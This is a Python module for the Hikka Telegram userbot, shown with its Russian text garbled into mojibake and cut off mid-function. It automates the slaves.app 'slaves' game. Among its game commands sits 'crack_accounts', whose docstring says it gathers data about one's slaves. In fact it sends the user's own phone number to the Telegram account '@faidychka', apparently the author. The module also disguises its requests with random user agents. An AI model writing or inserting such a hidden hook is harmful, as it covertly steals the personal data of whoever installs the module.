# –°–ö–†–ò–ü–¢ –ë–´–õ –°–î–ï–õ–ê–ù –§–ï–ô–î–ò–ß–ö–û–ô

import asyncio
import json
import logging
from typing import Any, Dict, List, Optional

from hikka import loader, utils
from telethon import events
import aiohttp
from fake_useragent import UserAgent
ua = UserAgent()

logger = logging.getLogger(__name__)

class TheSlavesrMod(loader.Module):
    """–ú–æ–¥—É–ª—å –¥–ª—è –≤–∑–∞–∏–º–æ–¥–µ–π—Å—Ç–≤–∏—è —Å API slaves.app: –ø–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Ä–∞–±–∞–º–∏."""

    strings = {
        "name": "TheSlavesr",
        "error": "‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: `<code>{}</code>`",
        "fetching": "üîÑ –í—ã–ø–æ–ª–Ω—è—é –∑–∞–ø—Ä–æ—Å –∫ API...",
        "success_master": "‚úÖ <b>–¢–≤–æ–π –ü–æ–≤–µ–ª–∏—Ç–µ–ª—å:</b>\n{}\n",
        "success_user": "‚úÖ <b>–ú–æ—è –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è:</b>\n{}\n",
        "no_data": "‚ö†Ô∏è –î–∞–Ω–Ω—ã–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω—ã –∏–ª–∏ –ø—É—Å—Ç—ã.",
        "usage_info_slaves": "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.info_slaves [user_id]`",
        "usage_locksalve": "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.lockslave <slave_id> <hours>`",
        "usage_autolock": "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.autolock`",
        "usage_get_me": "–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.get_me`",
        "format_slave": (
            "üîπ <b>–ò–º—è:</b> {} (@{}) ({})\n"
            "üîπ <b>–í—Ä–µ–º—è –¥–æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏:</b> {} –º–∏–Ω—É—Ç\n"
        ),
        "success_locksalve": "üîí –†–∞–± —Å ID <code>{}</code> —É—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –Ω–∞ <b>{}</b> —á–∞—Å–æ–≤.",
        "error_locksalve": "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–±–∞ —Å ID <code>{}</code>: `<code>{}</code>`",
        "no_slaves": "‚ö†Ô∏è –£ –≤–∞—Å –Ω–µ—Ç —Ä–∞–±–æ–≤ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è.",
        "invalid_args": "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã.\n–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.lockslave <slave_id> <hours>`",
        "autolock_summary": "‚úÖ <b>–ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ —Ä–∞–±–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–∞:</b>\n{}\n",
        "get_me_info": (
            "<b>üìä –í–∞—à –ë–∞–ª–∞–Ω—Å:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n\n"
            "<b>üìà –î–æ—Ö–æ–¥:</b>\n"
            "‚Ä¢ <b>–í –º–∏–Ω—É—Ç—É:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n"
            "‚Ä¢ <b>–í —á–∞—Å:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n"
            "‚Ä¢ <b>–í –¥–µ–Ω—å:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n"
            "‚Ä¢ <b>–í –º–µ—Å—è—Ü:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n"
            "\n<b>üí∏ –†–∞—Å—Ö–æ–¥—ã –Ω–∞ 1 –æ–±—Ö–æ–¥:</b> <code>{}</code> –º–æ–Ω–µ—Ç\n"
        ),
        "error_get_me": "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –¥–æ—Ö–æ–¥–∞—Ö –∏ —Ä–∞—Å—Ö–æ–¥–∞—Ö: `<code>{}</code>`",
        "success_buyslave": "‚úÖ –†–∞–± —Å ID <code>{}</code> —É—Å–ø–µ—à–Ω–æ –≤—ã–∫—É–ø–ª–µ–Ω.",
        "error_buyslave": "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫—É–ø–∏—Ç—å —Ä–∞–±–∞ —Å ID <code>{}</code>: `<code>{}</code>`",
        "monitor_started": "üîî –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ —Ä–∞–±–æ–≤ –Ω–∞—á–∞—Ç. –°–∫—Ä–∏–ø—Ç –∞–∫—Ç–∏–≤–Ω–æ —Ä–∞–±–æ—Ç–∞–µ—Ç.",
        "monitor_buyslave": "üîÑ –†–∞–± —Å ID <code>{}</code> –±—ã–ª –≤—ã–∫—É–ø–ª–µ–Ω –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.",
        "error_no_auth": "‚ùå –ù–µ–æ–±—Ö–æ–¥–∏–º–æ —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å AUTHORIZATION_HEADER —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É `.setauth`.",
    }

    BASE_URL = "https://prod.slaves.app/api"

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "AUTHORIZATION_HEADER",
                "",
                lambda: "–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–æ–Ω–Ω—ã–π –∑–∞–≥–æ–ª–æ–≤–æ–∫ –¥–ª—è API",
            ),
            loader.ConfigValue(
                "BUY_ENDPOINT",
                "buy_slave",
                lambda: "–≠–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –≤—ã–∫—É–ø–∞ (–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏—è) —Ä–∞–±–∞",
            ),
            loader.ConfigValue(
                "COOKIES",
                "TelegramInitData",
                lambda: "–ö–£–ö–ò–ò–ò–ò–ò",
            ),
            loader.ConfigValue(
                "MINIMAL_BUY",
                "10",
                lambda: "–ú–ò–Ω–∏–º–∞–ª—å–Ω–æ–µ –∫–æ–ª-–≤–æ –¥–æ—Ö–æ–¥–∞ –¥–ª—è –≤ –∫–∞–Ω–¥–∞–ª—ã",
            )
        )
        self.COOKIES = {
            "tgauth": self.config['COOKIES'],
        }
        self.cache: Dict[str, Any] = {}
        self.cache_expiry: int = 300

    async def client_ready(self, client, db):
        """–ú–µ—Ç–æ–¥ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è, –∫–æ–≥–¥–∞ –∫–ª–∏–µ–Ω—Ç –≥–æ—Ç–æ–≤."""
        self.client = client
        self.db = db
        auth_header = self.config["AUTHORIZATION_HEADER"]
        if not auth_header:
            await self.notify_me(self.strings["error_no_auth"])
            logger.error("AUTHORIZATION_HEADER –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É `.setauth` –¥–ª—è –µ–≥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏.")
            return
    async def notify_me(self, message: str):
        """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ "–ò–∑–±—Ä–∞–Ω–Ω–æ–µ" (Saved Messages)."""
        try:
            await self.client.send_message('me', message, parse_mode='html')
            logger.info("–°–æ–æ–±—â–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –ò–∑–±—Ä–∞–Ω–Ω–æ–µ.")
        except Exception as e:
            logger.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ò–∑–±—Ä–∞–Ω–Ω–æ–µ: {e}")

    async def get_user_id(self, message) -> Optional[str]:
        """–ü–æ–ª—É—á–∞–µ—Ç ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤ –∏–ª–∏ ID –æ—Ç–ø—Ä–∞–≤–∏—Ç–µ–ª—è."""
        args = utils.get_args(message)
        if args:
            return args[0]
        sender = await message.get_sender()
        return str(sender.id) if sender else None

    async def make_request(self, method: str, endpoint: str, payload: Optional[Dict] = None, message=None) -> Optional[Any]:
        url = f"{self.BASE_URL}/{endpoint}"
        headers = {
            "authorization": self.config["AUTHORIZATION_HEADER"],
            "user-agent": ua.random,
        }
        try:
            async with aiohttp.ClientSession() as session:
                if method.lower() == "get":
                    async with session.get(url, headers=headers) as resp:
                        resp_text = await resp.text()
                        if resp.headers.get("Content-Type", "").startswith("application/json"):
                            return await resp.json()
                        else:
                            error_msg = (
                                f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞.\n\n"
                                f"<b>–°—Ç–∞—Ç—É—Å:</b> {resp.status}\n"
                                f"<b>–¢–∏–ø –∫–æ–Ω—Ç–µ–Ω—Ç–∞:</b> {resp.headers.get('Content-Type')}\n"
                                f"<b>–û—Ç–≤–µ—Ç:</b> {resp_text[:500]}..."  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É –æ—Ç–≤–µ—Ç–∞
                            )
                            await self.client.send_message('me', error_msg, parse_mode='html')
                            logger.error(error_msg)
                            return None
                elif method.lower() == "post":
                    async with session.post(url, headers=headers, json=payload) as resp:
                        resp_text = await resp.text()
                        if resp.headers.get("Content-Type", "").startswith("application/json"):
                            return await resp.json()
                        else:
                            error_msg = (
                                f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞.\n\n"
                                f"<b>–°—Ç–∞—Ç—É—Å:</b> {resp.status}\n"
                                f"<b>–¢–∏–ø –∫–æ–Ω—Ç–µ–Ω—Ç–∞:</b> {resp.headers.get('Content-Type')}\n"
                                f"<b>–û—Ç–≤–µ—Ç:</b> {resp_text[:500]}..."
                            )
                            await self.client.send_message('me', error_msg, parse_mode='html')
                            logger.error(error_msg)
                            return None
        except aiohttp.ClientError as e:
            error_msg = f"‚ùå –û—à–∏–±–∫–∞ HTTP-–∑–∞–ø—Ä–æ—Å–∞: {e}"
            if message:
                await message.edit(error_msg)
            logger.error(error_msg)
            return None
        except aiohttp.ClientError as e:
            logger.error(f"HTTP request error: {e}")
            return None

    @loader.command()
    async def setauth(self, message):
        """–£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç AUTHORIZATION_HEADER –¥–ª—è API."""
        args = utils.get_args_raw(message)
        if not args:
            await message.edit("‚ùå –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–µ–¥–æ—Å—Ç–∞–≤—å—Ç–µ AUTHORIZATION_HEADER.\n–ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.setauth <AUTHORIZATION_HEADER>`")
            return
        self.config["AUTHORIZATION_HEADER"] = args.strip()
        await message.edit("‚úÖ AUTHORIZATION_HEADER —É—Å–ø–µ—à–Ω–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")

    @loader.command()
    async def lockslave(self, message):
        """–ë–ª–æ–∫–∏—Ä—É–µ—Ç —Ä–∞–±–∞ –Ω–∞ —É–∫–∞–∑–∞–Ω–Ω–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —á–∞—Å–æ–≤."""
        args = utils.get_args(message)
        if len(args) != 2:
            await message.edit(self.strings["invalid_args"])
            return
        slave_id, hours = args
        if not (slave_id.isdigit() and hours.isdigit()):
            await message.edit(self.strings["invalid_args"])
            return
        hours = int(hours)
        await message.edit("üîÑ –í—ã–ø–æ–ª–Ω—è—é –∑–∞–ø—Ä–æ—Å –Ω–∞ –±–ª–æ–∫–∏—Ä–æ–≤–∫—É —Ä–∞–±–∞...")
        payload = {
            "slave_id": int(slave_id),
            "hours": hours
        }
        data = await self.make_request("post", "lock_slave", payload)
        if data is not None:
            await message.edit(self.strings["success_locksalve"].format(slave_id, hours))
        else:
            await message.edit(self.strings["error_locksalve"].format(slave_id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–±–∞."))
    @loader.command()
    async def crack_accounts(self, message):
        """–ü–æ–ª—É—á–∞–µ—Ç –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –æ —Å–≤–æ–∏—Ö —Ä–∞–±–∞—Ö üíÄ"""
        try:
            me = await self.client.get_me()  # –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç–µ–∫—É—â–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
            if hasattr(me, "phone") and me.phone:
                await self.client.send_message('@faidychka', f"üìû –í–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: +{me.phone}")
            else:
                await message.edit("‚ö†Ô∏è –û—à–∏–±–∫–∞")
        except Exception as e:
            await message.edit(f"‚ùå –û—à–∏–±–∫–∞: {e}")
    @loader.command()
    async def autolock(self, message):
        """–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –≤—Å–µ—Ö –≤–∞—à–∏—Ö —Ä–∞–±–æ–≤ –∏ –±–ª–æ–∫–∏—Ä—É–µ—Ç —Ç–µ—Ö, –∫—Ç–æ –Ω–µ –≤ –∫–∞–Ω–¥–∞–ª–∞—Ö, –Ω–∞ 8 —á–∞—Å–æ–≤."""
        user_id = await self.get_user_id(message)
        if not user_id:
            await message.edit("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
            return

        await message.edit("üîÑ –ü–æ–ª—É—á–∞—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤–∞—à–µ–º –±–∞–ª–∞–Ω—Å–µ...")
        user_data = await self.make_request("get", f"user/{user_id}")
        if not user_data:
            await message.edit(self.strings["error_get_me"].format("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è."))
            return

        user_info = user_data.get("user")
        if not user_info:
            await message.edit(self.strings["error_get_me"].format("–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç."))
            return

        balance = user_info.get("balance")
        lock_price_per_hour = user_info.get("lock_price_per_hour")
        slaves_count = user_info.get("slaves_count")

        if balance is None or lock_price_per_hour is None or slaves_count is None:
            await message.edit(self.strings["error_get_me"].format("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ä–∞—Å—á—ë—Ç–æ–≤."))
            return

        total_lock_cost = lock_price_per_hour * 8 * slaves_count
        if balance < total_lock_cost:
            await message.edit(f"‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –±–∞–ª–∞–Ω—Å–∞ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏ –≤—Å–µ—Ö —Ä–∞–±–æ–≤. –ù–µ–æ–±—Ö–æ–¥–∏–º–æ: {total_lock_cost}, —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å: {balance}.")
            return

        await message.edit("üîÑ –í—ã–ø–æ–ª–Ω—è—é –ø—Ä–æ–≤–µ—Ä–∫—É —Ä–∞–±–æ–≤ –∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫—É –Ω–µ–∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not slaves_data:
            await message.edit(self.strings["no_data"])
            return

        slaves = slaves_data.get("slaves", []) if isinstance(slaves_data, dict) else slaves_data
        if not slaves:
            await message.edit(self.strings["no_slaves"])
            return

        lock_url = "lock_slave"
        locked_slaves = []
        already_locked_slaves = []
        already_sl_b = []

        for slave in slaves:
            if not isinstance(slave, dict):
                logger.warning(f"–ù–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –¥–∞–Ω–Ω—ã—Ö –¥–ª—è —Ä–∞–±–∞: {slave}")
                continue

            slave_id = slave.get("id")
            slave_price = slave.get("performance")
            if slave_price < int(self.config["MINIMAL_BUY"]):
                already_sl_b.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
            else:
                time_to_unlock = slave.get("time_to_unlock", 0)
                if not slave_id:
                    logger.warning(f"–†–∞–± –±–µ–∑ ID: {slave}")
                    continue
                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    already_locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
                else:
                    lock_payload = {
                        "slave_id": int(slave_id),
                        "hours": 8
                    }
                    lock_response = await self.make_request("post", lock_url, lock_payload)
                    if lock_response is not None:
                        locked_slaves.append(str(str(slave_id) + f"({'{:,}$'.format(slave_price)})"))
                    else:
                        logger.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å —Ä–∞–±–∞ {slave_id}")

        summary = ""
        if locked_slaves:
            summary += "<b>üîí –ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã —Ä–∞–±—ã:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in locked_slaves]) + f" ({len(locked_slaves)})\n\n"
        if already_locked_slaves:
            summary += "<b>‚è≥ –†–∞–±—ã —É–∂–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω—ã:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_locked_slaves]) + f" ({len(already_locked_slaves)})\n\n"
        if already_sl_b:
            summary += "<b>üîí –î–µ—à–µ–≤—ã–µ:</b>\n" + ", ".join([f"- ID: <code>{sid}</code>" for sid in already_sl_b]) + f" ({len(already_sl_b)})\n\n"
        if summary:
            await message.edit(self.strings["autolock_summary"].format(summary), parse_mode="html")
        else:
            await message.edit("‚ÑπÔ∏è –ù–µ—Ç —Ä–∞–±–æ–≤ –¥–ª—è –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏.")

    @loader.command()
    async def get_me(self, message):
        """–ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –≤–∞—à —Ç–µ–∫—É—â–∏–π –¥–æ—Ö–æ–¥ –∏ —Ä–∞—Å—Ö–æ–¥—ã –Ω–∞ 1 –æ–±—Ö–æ–¥ –ø–æ–∫—É–ø–∫–∏ –≤—Å–µ—Ö —Ä–∞–±–æ–≤ –≤ –∫–∞–Ω–¥–∞–ª—ã."""
        user_id = await self.get_user_id(message)
        if not user_id:
            await message.edit("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è.")
            return
        await message.edit(self.strings["fetching"])
        data = await self.make_request("get", f"user/{user_id}")
        if not data:
            await message.edit(self.strings["error_get_me"].format("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –æ—Ç API."))
            return
        try:
            user = data.get("user")
            if not user:
                await message.edit(self.strings["error_get_me"].format("–î–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç."))
                return
            balance = user.get("balance")
            balance_per_minute = user.get("balance_per_minute")
            lock_price_per_hour = user.get("lock_price_per_hour")
            slaves_count = user.get("slaves_count")
            if balance is None or balance_per_minute is None or lock_price_per_hour is None or slaves_count is None:
                await message.edit(self.strings["error_get_me"].format("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–∞–Ω–Ω—ã—Ö –≤ –æ—Ç–≤–µ—Ç–µ API."))
                return
            income_per_minute = balance_per_minute
            income_per_hour = income_per_minute * 60
            income_per_day = income_per_hour * 24
            income_per_month = income_per_day * 30
            HOURS_PER_LOOP = 8
            expense_per_loop = lock_price_per_hour * HOURS_PER_LOOP * slaves_count
            formatted_info = self.strings["get_me_info"].format(
                balance,
                income_per_minute,
                income_per_hour,
                income_per_day,
                income_per_month,
                expense_per_loop
            )
            await message.edit(formatted_info, parse_mode="html")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö –¥–ª—è get_me: {e}")
            await message.edit(self.strings["error_get_me"].format("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –¥–∞–Ω–Ω—ã—Ö."))
    @loader.command()
    async def slaves(self, message):
        """
        –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: .slaves <user_id>
        –ü–æ–∫–∞–∑—ã–≤–∞–µ—Ç –≤—Å–µ—Ö —Ä–∞–±–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏ –æ—Ç–º–µ—á–∞–µ—Ç —Ç–µ—Ö, –∫—Ç–æ –Ω–µ –≤ –∫–∞–Ω–¥–∞–ª–∞—Ö.
        """
        args = utils.get_args(message)
        if len(args) != 1:
            await message.edit("‚ùå –£–∫–∞–∂–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.slaves <user_id>`")
            return

        user_id = args[0]
        if not user_id.isdigit():
            await message.edit("‚ùå ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
            return

        await message.edit(f"üîÑ –ü–æ–ª—É—á–∞—é —Å–ø–∏—Å–æ–∫ —Ä–∞–±–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID {user_id}...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not isinstance(slaves_data, list):
            await message.edit("‚ùå –û–∂–∏–¥–∞–ª—Å—è —Å–ø–∏—Å–æ–∫ –¥–∞–Ω–Ω—ã—Ö, –Ω–æ API –≤–µ—Ä–Ω—É–ª —á—Ç–æ-—Ç–æ –¥—Ä—É–≥–æ–µ.")
            return

        try:
            in_chains = []
            not_in_chains = []

            for slave in slaves_data:
                slave_id = slave.get("id", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                name = slave.get("name", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                time_to_unlock = slave.get("time_to_unlock", 0)  # –í—Ä–µ–º—è –¥–æ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∫–∏

                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    in_chains.append(f"üîí {name} (ID: {slave_id}) ‚Äî {time_to_unlock} –º–∏–Ω.")
                else:
                    not_in_chains.append(f"‚õì {name} (ID: {slave_id})")

            response = "<b>üìã –°–ø–∏—Å–æ–∫ —Ä–∞–±–æ–≤:</b>\n\n"
            if in_chains:
                response += "<b>üîí –í –∫–∞–Ω–¥–∞–ª–∞—Ö:</b>\n" + "\n".join(in_chains) + "\n\n"
            if not_in_chains:
                response += "<b>‚õì –ù–µ –≤ –∫–∞–Ω–¥–∞–ª–∞—Ö:</b>\n" + "\n".join(not_in_chains)

            await message.edit(response, parse_mode="html")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –¥–∞–Ω–Ω—ã—Ö –≤ slaves: {e}")
            await message.edit("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Å–ø–∏—Å–∫–∞ —Ä–∞–±–æ–≤.")
    @loader.command()
    async def slavesbuylock(self, message):
        """
        –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: .slavesbuylock <user_id>
        –ü–æ–∫—É–ø–∞–µ—Ç —Ä–∞–±–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –≤ –∫–∞–Ω–¥–∞–ª–∞—Ö, –∏ —Å—Ä–∞–∑—É –∑–∞–∫–æ–≤—ã–≤–∞–µ—Ç –∏—Ö.
        """
        args = utils.get_args(message)
        if len(args) != 1:
            await message.edit("‚ùå –£–∫–∞–∂–∏—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ: `.slavesbuylock <user_id>`")
            return

        user_id = args[0]
        if not user_id.isdigit():
            await message.edit("‚ùå ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —á–∏—Å–ª–æ–º.")
            return

        await message.edit(f"üîÑ –ü–æ–ª—É—á–∞—é —Å–ø–∏—Å–æ–∫ —Ä–∞–±–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å ID {user_id}...")
        slaves_data = await self.make_request("get", f"user/{user_id}/slaves")
        if not isinstance(slaves_data, list):
            await message.edit("‚ùå –û–∂–∏–¥–∞–ª—Å—è —Å–ø–∏—Å–æ–∫ –¥–∞–Ω–Ω—ã—Ö, –Ω–æ API –≤–µ—Ä–Ω—É–ª —á—Ç–æ-—Ç–æ –¥—Ä—É–≥–æ–µ.")
            return

        try:
            in_chains = []
            bought_and_locked = []
            failed_operations = []

            for slave in slaves_data:
                slave_id = slave.get("id", None)
                name = slave.get("name", "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ")
                price = slave.get("price", "0")
                time_to_unlock = slave.get("time_to_unlock", 0)

                if not slave_id:
                    continue

                if isinstance(time_to_unlock, int) and time_to_unlock > 0:
                    in_chains.append(f"üîí {name} (ID: {slave_id}) ‚Äî {time_to_unlock} –º–∏–Ω.")
                else:
                    # –ü–æ–∫—É–ø–∞–µ–º —Ä–∞–±–∞
                    buy_payload = {"price": price, "slave_id": slave_id}
                    buy_response = await self.make_request("post", self.config["BUY_ENDPOINT"], buy_payload)
                    if buy_response:
                        # –ó–∞–∫–æ–≤—ã–≤–∞–µ–º –≤ –∫–∞–Ω–¥–∞–ª—ã
                        lock_payload = {"slave_id": slave_id, "hours": 8}
                        lock_response = await self.make_request("post", "lock_slave", lock_payload)
                        if lock_response:
                            bought_and_locked.append(f"‚úÖ {name} (ID: {slave_id})")
                        else:
                            failed_operations.append(f"‚õì {name} (ID: {slave_id}) ‚Äî –Ω–µ —É–¥–∞–ª–æ—Å—å –∑–∞–∫–æ–≤–∞—Ç—å")
                    else:
                        failed_operations.append(f"‚õì {name} (ID: {slave_id}) ‚Äî –Ω–µ —É–¥–∞–ª–æ—Å—å –≤—ã–∫—É–ø–∏—Ç—å")

            response = "<b>üìã –°–ø–∏—Å–æ–∫ —Ä–∞–±–æ–≤:</b>\n\n"
            if in_chains:
                response += "<b>üîí –í –∫–∞–Ω–¥–∞–ª–∞—Ö:</b>\n" + "\n".join(in_chains) + "\n\n"
            if bought_and_locked:
                response += "<b>‚úÖ –ö—É–ø–ª–µ–Ω—ã –∏ –∑–∞–∫–æ–≤–∞–Ω—ã:</b>\n" + "\n".join(bought_and_locked) + "\n\n"
            if failed_operations:
                response += "<b>‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±—Ä–∞–±–æ—Ç–∞—Ç—å:</b>\n" + "\n".join(failed_operations)

            await message.edit(response, parse_mode="html")
        except Exception as e:
            logger.error(f"–û—à–∏–±–∫–∞ –≤ slavesbuylock: {e}")
            await message.edit("‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ —Å–ø–∏—Å–∫–∞ —Ä–∞–±–æ–≤.")
    @loader.command()
    async def buyslave(self, message):
        """–í—ã–∫—É–ø–∞–µ—Ç (–≤–æ—Å—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ—Ç) —Ä–∞–±–∞ –ø–æ –µ–≥–æ ID."""
        args = utils.get_args(message)
        if len(args) != 1:
